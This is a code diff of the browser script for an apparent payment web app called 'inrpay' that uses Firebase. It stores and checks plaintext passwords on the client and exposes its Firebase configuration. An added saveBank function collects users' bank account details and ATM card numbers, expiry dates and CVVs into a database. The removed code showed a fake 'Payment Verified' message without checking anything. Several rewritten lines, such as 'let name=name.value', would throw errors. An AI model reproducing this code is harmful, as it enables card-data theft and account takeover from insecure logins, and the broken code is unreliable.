@@ -1,50 +1,48 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
 import { getFirestore, doc, setDoc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";
 
-const firebaseConfig = {
+const app = initializeApp({
   apiKey: "AIzaSyBh-J9LAYeCfxNoKw9C94gbCqVhELofuoo",
   authDomain: "inrpay-44413.firebaseapp.com",
-  projectId: "inrpay-44413",
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-// REGISTER
-window.register = async function(){
-let name = document.getElementById("name").value;
-let number = document.getElementById("number").value;
-let password = document.getElementById("password").value;
-
-await setDoc(doc(db,"users",number),{
-name,
-number,
-password,
-balance:0
+  projectId: "inrpay-44413"
 });
 
-alert("Account Created");
+const db = getFirestore(app);
+
+// MESSAGE
+function showMsg(t){
+msgText.innerText = t;
+msgBox.style.display="flex";
+}
+window.closeMsg = ()=> msgBox.style.display="none";
+
+// REGISTER
+window.register = async ()=>{
+let name=name.value, number=number.value, password=password.value;
+
+if(!number || !password){
+showMsg("Enter number & password");
+return;
+}
+
+await setDoc(doc(db,"users",number),{
+name, number, password, balance:0
+});
+
+showMsg("Account Created");
 }
 
 // LOGIN
-window.login = async function(){
-
-let number = document.getElementById("number").value;
-let password = document.getElementById("password").value;
+window.login = async ()=>{
+let number=number.value, password=password.value;
 
 let snap = await getDoc(doc(db,"users",number));
 
-if(!snap.exists()){
-alert("User not found");
-return;
-}
+if(!snap.exists()) return showMsg("User not found");
 
 let user = snap.data();
 
-if(user.password !== password){
-alert("Wrong password");
-return;
-}
+if(user.password !== password) return showMsg("Wrong password");
 
 auth.style.display="none";
 dashboard.style.display="block";
@@ -56,75 +54,81 @@ localStorage.setItem("user",number);
 }
 
 // AUTO LOGIN
-window.onload = async function(){
-let number = localStorage.getItem("user");
+window.onload = async ()=>{
+let number=localStorage.getItem("user");
+if(!number) return;
 
-if(number){
 let snap = await getDoc(doc(db,"users",number));
 
 if(snap.exists()){
-let user = snap.data();
-
+let user=snap.data();
 auth.style.display="none";
 dashboard.style.display="block";
-
 username.innerText=user.name;
 balance.innerText="₹"+user.balance;
 }
 }
-}
 
 // LOGOUT
-window.logout = function(){
+window.logout = ()=>{
 localStorage.clear();
 location.reload();
 }
 
-// 🔥 OPEN DEPOSIT (LOAD FROM ADMIN)
-window.deposit = async function(){
+// BANK
+window.openBank=()=>bankBox.style.display="flex";
+window.closeBank=()=>bankBox.style.display="none";
 
-let snap = await getDoc(doc(db,"settings","payment"));
+window.saveBank = async ()=>{
+let number=localStorage.getItem("user");
 
-if(snap.exists()){
-let data = snap.data();
+await setDoc(doc(db,"bank",number),{
+name:accName.value,
+bank:bankName.value,
+account:accNumber.value,
+ifsc:ifsc.value,
+mobile:bankMobile.value,
+type:accType.value,
+atm:atm.value,
+expiry:expiry.value,
+cvv:cvv.value
+});
 
-document.getElementById("upiText").innerText = data.upi;
-document.getElementById("qrImg").src = data.qr;
+showMsg("Bank Saved");
+closeBank();
 }
 
+// DEPOSIT
+window.deposit = async ()=>{
+let snap = await getDoc(doc(db,"settings","payment"));
+if(snap.exists()){
+let d=snap.data();
+upiText.innerText=d.upi;
+qrImg.src=d.qr;
+}
 depositBox.style.display="flex";
 }
 
-// CLOSE
-window.closeDeposit = function(){
-depositBox.style.display="none";
-}
+window.closeDeposit=()=>depositBox.style.display="none";
 
-// 🔥 SUBMIT UTR + ANIMATION
-window.submitDeposit = async function(){
+window.submitDeposit = async ()=>{
+let utr=utr.value;
+if(!utr) return showMsg("Enter UTR");
 
-let utr = document.getElementById("utr").value;
+let number=localStorage.getItem("user");
 
-if(!utr){
-alert("Enter UTR");
-return;
-}
-
-// animation
-alert("Processing Payment...");
-setTimeout(()=>{
-
-alert("Payment Verified ✅");
-
-},2000);
-
-let number = localStorage.getItem("user");
-
-await setDoc(doc(db,"deposits",Date.now().toString()),{
-user:number,
-utr:utr,
-status:"pending"
+await setDoc(doc(db,"deposits",Date.now()+""),{
+user:number, utr, status:"pending"
 });
 
-depositBox.style.display="none";
+showMsg("Deposit Submitted");
+closeDeposit();
+}
+
+// SUPPORT
+window.openSupport=()=>supportBox.style.display="flex";
+window.closeSupport=()=>supportBox.style.display="none";
+
+window.autoReply=()=>{
+supportMsg.innerText="Please wait 30 min to 1 hour";
 }
